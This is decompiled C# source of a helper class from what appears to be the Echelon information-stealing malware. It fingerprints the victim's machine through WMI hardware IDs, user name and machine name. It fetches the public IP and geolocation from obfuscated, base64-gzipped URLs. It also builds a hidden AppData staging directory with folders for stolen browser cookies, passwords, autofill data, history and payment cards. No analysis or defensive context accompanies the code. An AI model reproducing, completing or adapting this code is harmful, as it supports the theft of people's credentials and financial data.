using System;
using System.Management;
using System.Net;
using System.Xml;

namespace Echelon.Global
{
	// Token: 0x02000047 RID: 71
	public static class Help
	{
		// Token: 0x0600019E RID: 414 RVA: 0x0000CA30 File Offset: 0x0000AC30
		public static string IP()
		{
			string result;
			try
			{
				result = new WebClient().DownloadString(Decrypt.Get("H4sIAAAAAAAEAMsoKSkottLXTyzI1MssyEyr1MsvStcHAPAN4yoWAAAA"));
			}
			catch
			{
				result = "Connection error";
			}
			return result;
		}

		// Token: 0x0600019F RID: 415 RVA: 0x0000CA74 File Offset: 0x0000AC74
		public static string CountryCOde()
		{
			string result;
			try
			{
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.LoadXml(new WebClient().DownloadString(Help.GeoIpURL));
				result = "[" + xmlDocument.GetElementsByTagName("countryCode")[0].InnerText + "]";
			}
			catch
			{
				result = "ERR";
			}
			return result;
		}

		// Token: 0x060001A0 RID: 416 RVA: 0x0000CAE4 File Offset: 0x0000ACE4
		public static string Country()
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(new WebClient().DownloadString(Help.GeoIpURL));
			return "[" + xmlDocument.GetElementsByTagName("country")[0].InnerText + "]";
		}

		// Token: 0x060001A1 RID: 417 RVA: 0x0000CB38 File Offset: 0x0000AD38
		public static string GetHwid()
		{
			string result = "";
			try
			{
				string str = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
				ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + str + ":\"");
				managementObject.Get();
				result = managementObject["VolumeSerialNumber"].ToString();
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x060001A2 RID: 418 RVA: 0x0000CBA4 File Offset: 0x0000ADA4
		public static string GetProcessorID()
		{
			string result = "";
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor").Get())
			{
				result = (string)((ManagementObject)managementBaseObject)["ProcessorId"];
			}
			return result;
		}

		// Token: 0x0400008B RID: 139
		public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

		// Token: 0x0400008C RID: 140
		public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x0400008D RID: 141
		public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x0400008E RID: 142
		public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

		// Token: 0x0400008F RID: 143
		public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

		// Token: 0x04000090 RID: 144
		public static readonly string userName = Environment.UserName;

		// Token: 0x04000091 RID: 145
		public static readonly string machineName = Environment.MachineName;

		// Token: 0x04000092 RID: 146
		public static string HWID = Help.GetProcessorID() + Help.GetHwid();

		// Token: 0x04000093 RID: 147
		public static string GeoIpURL = Decrypt.Get("H4sIAAAAAAAEAMsoKSmw0tfPLNBNLMjUS87P1a/IzQEAoQIM4RUAAAA=");

		// Token: 0x04000094 RID: 148
		public static string dir = string.Concat(new string[]
		{
			Help.AppDate,
			"\\",
			GenString.Generate(),
			Help.HWID,
			GenString.GeneNumbersTo().ToString()
		});

		// Token: 0x04000095 RID: 149
		public static string collectionDir = string.Concat(new string[]
		{
			Help.dir,
			"\\",
			GenString.GeneNumbersTo().ToString(),
			Help.HWID,
			GenString.Generate()
		});

		// Token: 0x04000096 RID: 150
		public static string Browsers = Help.collectionDir + "\\Browsers";

		// Token: 0x04000097 RID: 151
		public static string Cookies = Help.Browsers + "\\Cookies";

		// Token: 0x04000098 RID: 152
		public static string Passwords = Help.Browsers + "\\Passwords";

		// Token: 0x04000099 RID: 153
		public static string Autofills = Help.Browsers + "\\Autofills";

		// Token: 0x0400009A RID: 154
		public static string Downloads = Help.Browsers + "\\Downloads";

		// Token: 0x0400009B RID: 155
		public static string History = Help.Browsers + "\\History";

		// Token: 0x0400009C RID: 156
		public static string Cards = Help.Browsers + "\\Cards";

		// Token: 0x0400009D RID: 157
		public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm:ss tt");

		// Token: 0x0400009E RID: 158
		public static string dateLog = DateTime.Now.ToString("MM/dd/yyyy");
	}
}
